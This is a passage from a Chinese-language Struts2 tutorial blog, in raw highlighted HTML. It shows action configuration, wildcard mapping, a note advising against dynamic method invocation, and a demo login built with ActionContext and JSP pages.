class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">package</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;struts2_1&quot;</span> <span class="hljs-attr">namespace</span>=<span class="hljs-string">&quot;/&quot;</span> <span class="hljs-attr">extends</span>=<span class="hljs-string">&quot;struts-default&quot;</span>&gt;</span> <br>   <span class="hljs-comment">&lt;!-- 使用pjo完成action操作 --&gt;</span><br>   <span class="hljs-tag">&lt;<span class="hljs-name">action</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;action1&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;cn.itcast.action.Demo1Action&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">result</span> &gt;</span>/success.jsp<span class="hljs-tag">&lt;/<span class="hljs-name">result</span>&gt;</span><br>   <span class="hljs-tag">&lt;/<span class="hljs-name">action</span>&gt;</span><br>   <span class="hljs-comment">&lt;!-- 实现Action类来完成action操作 --&gt;</span><br>   <span class="hljs-tag">&lt;<span class="hljs-name">action</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;action2&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;cn.itcast.action.Demo2Action&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">result</span> &gt;</span>/success.jsp<span class="hljs-tag">&lt;/<span class="hljs-name">result</span>&gt;</span><br>   <span class="hljs-tag">&lt;/<span class="hljs-name">action</span>&gt;</span><br>   <span class="hljs-comment">&lt;!-- 通过继承ActionSupport来完成action操作 --&gt;</span><br>   <span class="hljs-tag">&lt;<span class="hljs-name">action</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;action3&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;cn.itcast.action.Demo3Action&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">result</span> &gt;</span>/success.jsp<span class="hljs-tag">&lt;/<span class="hljs-name">result</span>&gt;</span><br>   <span class="hljs-tag">&lt;/<span class="hljs-name">action</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">package</span>&gt;</span><br></code></pre></td></tr></table></figure><p>在开发中，第三种方法经常用到</p><h3 id="通配符配置Action类"><a href="#通配符配置Action类" class="headerlink" title="通配符配置Action类"></a>通配符配置Action类</h3><p>先写一下常规写法</p><p>新建一个BookAction类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> cn.itcast.action;<br><br><span class="hljs-keyword">import</span> com.opensymphony.xwork2.ActionSupport;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">BookAction</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">ActionSupport</span></span>&#123;<br><br><span class="hljs-function"><span class="hljs-keyword">public</span> String <span class="hljs-title">add</span><span class="hljs-params">()</span></span>&#123;<br>System.out.println(<span class="hljs-string">&quot;Book add&quot;</span>);<br><span class="hljs-keyword">return</span> SUCCESS;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">public</span> String <span class="hljs-title">delete</span><span class="hljs-params">()</span></span>&#123;<br>System.out.println(<span class="hljs-string">&quot;Book delete&quot;</span>);<br><span class="hljs-keyword">return</span> SUCCESS;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">public</span> String <span class="hljs-title">update</span><span class="hljs-params">()</span></span>&#123;<br>System.out.println(<span class="hljs-string">&quot;Book update&quot;</span>);<br><span class="hljs-keyword">return</span> SUCCESS;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">public</span> String <span class="hljs-title">find</span><span class="hljs-params">()</span></span>&#123;<br>System.out.println(<span class="hljs-string">&quot;Book find&quot;</span>);<br><span class="hljs-keyword">return</span> SUCCESS;<br>&#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><p>book.jsp</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;/FirstStruts3/book/add&quot;</span>&gt;</span>book add<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">br</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;/FirstStruts3/book/delete&quot;</span>&gt;</span>book delete<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">br</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;/FirstStruts3/book/update&quot;</span>&gt;</span>book update<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">br</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;/FirstStruts3/book/find&quot;</span>&gt;</span>book find<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">br</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br></code></pre></td></tr></table></figure><p>在struts.xml配置</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">package</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;struts2_2&quot;</span> <span class="hljs-attr">namespace</span>=<span class="hljs-string">&quot;/book&quot;</span> <span class="hljs-attr">extends</span>=<span class="hljs-string">&quot;struts-default&quot;</span>&gt;</span> <br>   <span class="hljs-comment">&lt;!--常规Action配置--&gt;</span><br>   <span class="hljs-tag">&lt;<span class="hljs-name">action</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;add&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;cn.itcast.action.BookAction&quot;</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;add&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">result</span> &gt;</span>/success.jsp<span class="hljs-tag">&lt;/<span class="hljs-name">result</span>&gt;</span><br>   <span class="hljs-tag">&lt;/<span class="hljs-name">action</span>&gt;</span><br>   <span class="hljs-tag">&lt;<span class="hljs-name">action</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;delete&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;cn.itcast.action.BookAction&quot;</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;delete&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">result</span> &gt;</span>/success.jsp<span class="hljs-tag">&lt;/<span class="hljs-name">result</span>&gt;</span><br>   <span class="hljs-tag">&lt;/<span class="hljs-name">action</span>&gt;</span><br>   <span class="hljs-tag">&lt;<span class="hljs-name">action</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;update&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;cn.itcast.action.BookAction&quot;</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;update&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">result</span> &gt;</span>/success.jsp<span class="hljs-tag">&lt;/<span class="hljs-name">result</span>&gt;</span><br>   <span class="hljs-tag">&lt;/<span class="hljs-name">action</span>&gt;</span><br>   <span class="hljs-tag">&lt;<span class="hljs-name">action</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;find&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;cn.itcast.action.BookAction&quot;</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;find&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">result</span> &gt;</span>/success.jsp<span class="hljs-tag">&lt;/<span class="hljs-name">result</span>&gt;</span><br>   <span class="hljs-tag">&lt;/<span class="hljs-name">action</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">package</span>&gt;</span><br></code></pre></td></tr></table></figure><p>跑一下项目，都打印出来了<br><img src="https://img-blog.csdnimg.cn/20210326113943563.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>在使用struts2时，每一个action都需要配置，每一个action里面的方法以及其返回到的界面都需要配置，如果一个一个配置，就太麻烦了，这里我们可以约定一些命名规范，然后再struts.xml里面使用通配符配置。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">package</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;struts2_2&quot;</span> <span class="hljs-attr">namespace</span>=<span class="hljs-string">&quot;/book&quot;</span> <span class="hljs-attr">extends</span>=<span class="hljs-string">&quot;struts-default&quot;</span>&gt;</span> <br>   <span class="hljs-comment">&lt;!--使用通配符的Action配置--&gt;</span><br>   <span class="hljs-tag">&lt;<span class="hljs-name">action</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;*&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;cn.itcast.action.BookAction&quot;</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;&#123;1&#125;&quot;</span>&gt;</span><br>   <span class="hljs-comment">&lt;!--&#123;1&#125;代表匹配一个*--&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">result</span> &gt;</span>/success.jsp<span class="hljs-tag">&lt;/<span class="hljs-name">result</span>&gt;</span><br>   <span class="hljs-tag">&lt;/<span class="hljs-name">action</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">package</span>&gt;</span><br></code></pre></td></tr></table></figure><p>也可以成功<br><img src="https://img-blog.csdnimg.cn/20210326114605767.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h3 id="Action的动态方法调用"><a href="#Action的动态方法调用" class="headerlink" title="Action的动态方法调用"></a>Action的动态方法调用</h3><p>在实际生活中，Action太多不便管理，为了减少Action，通常在一个Action中编写不同的方法处理不同的请求，如编写LoginAction，其中login()方法处理登陆请求，register()方法处理注册请求，此时可以采用动态方法调用来处理。</p><p>在使用动态方法调用时，在Action的名字中使用<code>!</code>符号来标识要调用方法的名称，语法格式如下：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span>=<span class="hljs-string">&quot;Action名称!方法名称&quot;</span>&gt;</span><br></code></pre></td></tr></table></figure><p>使用动态方法调用将请求提交给Action时，表单中的每个按钮提交事件都交给同一个Action，只是对应Action中的不同方法。只需要在struts.xml中只要配置该Action</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">action</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;Action名字&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;包名.Action类名&quot;</span>&gt;</span><br> &lt;result&quot;&gt;/test.jsp<span class="hljs-tag">&lt;/<span class="hljs-name">result</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">action</span>&gt;</span><br></code></pre></td></tr></table></figure><p>当开启动态方法调用功能时，应当将下面的常量置为true</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-comment">&lt;!-- 动态方法调用是否开启，默认是关闭的 --&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">constant</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;struts.enable.DynamicMethodInvocation&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;false&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">constant</span>&gt;</span><br></code></pre></td></tr></table></figure><p>不推荐使用动态方法调用，因为会存在安全隐患。</p><h2 id="访问Servlet-API的方法"><a href="#访问Servlet-API的方法" class="headerlink" title="访问Servlet API的方法"></a>访问Servlet API的方法</h2><h3 id="通过ActionContext类访问"><a href="#通过ActionContext类访问" class="headerlink" title="通过ActionContext类访问"></a>通过ActionContext类访问</h3><p>truts2提供了ActionContext类，struts2可以通过该类来实现与Servlet API的访问。</p><p>ActionContext类提供了如下几种方法：</p><table><thead><tr><th>方法说明</th><th>功能描述</th></tr></thead><tbody><tr><td>Object get(Object key)</td><td>类似于调用HttpServletRequest的getAttribute(String name)方法</td></tr><tr><td>Map getApplication()</td><td>返回一个Map对象，该对象模拟了该应用的ServletContext实例</td></tr><tr><td>static ActionContext getContext()</td><td>这是个静态方法 获取系统的ActionContext实例</td></tr><tr><td>Map getParameters()</td><td>获取所有的请求参数，类似于调用HttpServletRequest对象的getParameterMap()方法</td></tr><tr><td>Map getSession（）</td><td>返回一个Map对象，该对象模拟了HttpSession 实例</td></tr><tr><td>void setApplication(Map application)</td><td>传入一个Map实例，将Map实例的key-value转换成application的属性名-值。</td></tr><tr><td>void setSession(Map session)</td><td>传入一个Map实例，将Map实例的key-value转换成application的属性名-值。</td></tr></tbody></table><p>实例1：通过ActionContext类实现登陆</p><p>LoginAction.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> cn.itcast.action;<br><span class="hljs-keyword">import</span> com.opensymphony.xwork2.ActionContext;<br><span class="hljs-keyword">import</span> com.opensymphony.xwork2.ActionSupport;<br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">LoginAction</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">ActionSupport</span></span>&#123;<br><span class="hljs-keyword">private</span> String username;<br><span class="hljs-keyword">private</span> String password;<br><br><span class="hljs-function"><span class="hljs-keyword">public</span> String <span class="hljs-title">getUsername</span><span class="hljs-params">()</span> </span>&#123;<br><span class="hljs-keyword">return</span> username;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">setUsername</span><span class="hljs-params">(String username)</span> </span>&#123;<br><span class="hljs-keyword">this</span>.username = username;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">public</span> String <span class="hljs-title">getPassword</span><span class="hljs-params">()</span> </span>&#123;<br><span class="hljs-keyword">return</span> password;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">setPassword</span><span class="hljs-params">(String password)</span> </span>&#123;<br><span class="hljs-keyword">this</span>.password = password;<br>&#125;<br>    <br><span class="hljs-function"><span class="hljs-keyword">public</span> String <span class="hljs-title">execute</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception </span>&#123;<br>ActionContext context=ActionContext.getContext();<br><span class="hljs-keyword">if</span>(<span class="hljs-string">&quot;admin&quot;</span>.equals(username)&amp;&amp;<span class="hljs-string">&quot;123456&quot;</span>.equals(password))&#123;<br>context.put(<span class="hljs-string">&quot;username&quot;</span>, username);<br>context.put(<span class="hljs-string">&quot;password&quot;</span>, password);<br>context.put(<span class="hljs-string">&quot;success&quot;</span>, <span class="hljs-string">&quot;用户登录成功！&quot;</span>);<br><span class="hljs-keyword">return</span> SUCCESS;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>context.put(<span class="hljs-string">&quot;error&quot;</span>, <span class="hljs-string">&quot;用户登录失败！&quot;</span>);<br><span class="hljs-keyword">return</span> ERROR;<br>&#125;<br><br>&#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>web.xml</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">web-app</span> <span class="hljs-attr">xmlns:xsi</span>=<span class="hljs-string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span> <span class="hljs-attr">xmlns</span>=<span class="hljs-string">&quot;http://java.sun.com/xml/ns/javaee&quot;</span> <span class="hljs-attr">xsi:schemaLocation</span>=<span class="hljs-string">&quot;http://java.sun.com/xml/ns/javaee http://java.sun.com/xml/ns/javaee/web-app_3_0.xsd&quot;</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;WebApp_ID&quot;</span> <span class="hljs-attr">version</span>=<span class="hljs-string">&quot;3.0&quot;</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">display-name</span>&gt;</span>FirstStruts2<span class="hljs-tag">&lt;/<span class="hljs-name">display-name</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">welcome-file-list</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">welcome-file</span>&gt;</span>index.html<span class="hljs-tag">&lt;/<span class="hljs-name">welcome-file</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">welcome-file</span>&gt;</span>index.htm<span class="hljs-tag">&lt;/<span class="hljs-name">welcome-file</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">welcome-file</span>&gt;</span>index.jsp<span class="hljs-tag">&lt;/<span class="hljs-name">welcome-file</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">welcome-file</span>&gt;</span>default.html<span class="hljs-tag">&lt;/<span class="hljs-name">welcome-file</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">welcome-file</span>&gt;</span>default.htm<span class="hljs-tag">&lt;/<span class="hljs-name">welcome-file</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">welcome-file</span>&gt;</span>default.jsp<span class="hljs-tag">&lt;/<span class="hljs-name">welcome-file</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">welcome-file-list</span>&gt;</span><br>    <span class="hljs-comment">&lt;!--配置Struts2核心过滤器--&gt;</span><br>   <span class="hljs-tag">&lt;<span class="hljs-name">filter</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">filter-name</span>&gt;</span>struts2<span class="hljs-tag">&lt;/<span class="hljs-name">filter-name</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">filter-class</span>&gt;</span>org.apache.struts2.dispatcher.ng.filter.StrutsPrepareAndExecuteFilter<span class="hljs-tag">&lt;/<span class="hljs-name">filter-class</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">filter</span>&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">filter-mapping</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">filter-name</span>&gt;</span>struts2<span class="hljs-tag">&lt;/<span class="hljs-name">filter-name</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">url-pattern</span>&gt;</span>/*<span class="hljs-tag">&lt;/<span class="hljs-name">url-pattern</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">filter-mapping</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">web-app</span>&gt;</span><br></code></pre></td></tr></table></figure><p>struts.xml</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; ?&gt;</span><br><span class="hljs-comment">&lt;!-- 指定Struts2配置文件的D2T信息 --&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-meta-keyword">struts</span> <span class="hljs-meta-keyword">PUBLIC</span></span><br><span class="hljs-meta"><span class="hljs-meta-string">&quot;-//Apache Software Foundation//DTD Struts Configuration 2.3//EN&quot;</span></span><br><span class="hljs-meta"><span class="hljs-meta-string">&quot;http://struts.apache.org/dtds/struts-2.3.dtd&quot;</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">struts</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">package</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;LoginDemo&quot;</span> <span class="hljs-attr">extends</span>=<span class="hljs-string">&quot;struts-default&quot;</span> <span class="hljs-attr">namespace</span>=<span class="hljs-string">&quot;/&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">action</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;login&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;cn.itcast.action.LoginAction&quot;</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;success&quot;</span>&gt;</span>/success.jsp<span class="hljs-tag">&lt;/<span class="hljs-name">result</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;error&quot;</span>&gt;</span>/error.jsp<span class="hljs-tag">&lt;/<span class="hljs-name">result</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">action</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">package</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">struts</span>&gt;</span><br></code></pre></td></tr></table></figure><p>login.jsp</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs html">&lt;%@ page language=&quot;java&quot; contentType=&quot;text/html; charset=UTF-8&quot;<br>    pageEncoding=&quot;UTF-8&quot;%&gt;<br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-meta-keyword">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">&quot;UTF-8&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>登陆页面<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">align</span>=<span class="hljs-string">&quot;center&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span>=<span class="hljs-string">&quot;login&quot;</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;post&quot;</span>&gt;</span><br>账号:<span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;username&quot;</span>/&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">br</span>&gt;</span><br>密码:<span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;password&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;password&quot;</span>/&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">br</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;submit&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;登陆&quot;</span>/&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">br</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure><p>success.jsp</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs html">&lt;%@ page language=&quot;java&quot; contentType=&quot;text/html; charset=UTF-8&quot;<br>    pageEncoding=&quot;UTF-8&quot;%&gt;<br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-meta-keyword">html</span> <span class="hljs-meta-keyword">PUBLIC</span> <span class="hljs-meta-string">&quot;-//W3C//DTD HTML 4.01 Transitional//EN&quot;</span> <span class="hljs-meta-string">&quot;http://www.w3.org/TR/html4/loose.dtd&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>登陆成功页面<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">algin</span>=<span class="hljs-string">center</span>&gt;</span>通过ActionContext类访问Servelt API<span 